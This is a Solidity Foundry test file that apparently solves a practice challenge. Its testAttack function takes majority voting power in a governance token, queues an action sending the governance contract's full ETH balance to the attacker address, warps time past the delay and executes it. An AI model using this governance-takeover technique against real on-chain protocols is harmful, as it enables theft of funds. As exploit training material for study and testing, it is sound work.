// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/Test.sol";
import {UtilsTest} from "./Utils.t.sol";

contract SimpleGovernanceTest is UtilsTest {
    function setUp() public override {
        UtilsTest.setUp();
    }

    function testVotesSupply() public view {
        assertEq(dvtVotes.totalSupply(), 1500000 ether);
    }

    function testAttack() public {
        dvtVotes.transfer(address(target), (dvtVotes.totalSupply() + 10) / 2);

        // Activate voting power
        vm.startPrank(address(target));

        dvtVotes.delegate(address(target));
        dvtVotes.getVotes(address(target));
        dvtVotes.balanceOf(address(target));

        simpleGovernance.queueAction(
            address(target),
            uint128(address(simpleGovernance).balance),
            ""
        );

        simpleGovernance.getAction(1);

        vm.warp(block.timestamp + 2 days);

        simpleGovernance.executeAction(1);

        console2.log(address(target).balance);
    }
}
